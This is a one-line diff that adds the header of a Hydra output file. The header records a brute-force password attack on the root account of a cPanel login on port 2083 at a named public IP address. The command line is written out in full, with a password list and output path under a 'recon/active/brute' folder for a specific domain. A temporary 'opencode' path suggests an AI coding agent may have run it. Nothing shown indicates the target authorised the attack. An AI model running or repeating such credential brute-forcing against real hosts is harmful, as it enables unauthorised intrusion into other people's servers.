@@ -1,0 +1,1 @@
+# Hydra v9.5 run at 2026-08-20 06:16:24 on 177.154.191.198 http-get (hydra -l root -P /tmp/opencode/cpanel_pass.txt -t 4 -f -w 3 -o /home/ubuntu/pmminas.com/recon/active/brute/hydra_cpanel_177_root.txt -m /login:user=^USER^ https-get://177.154.191.198:2083/)
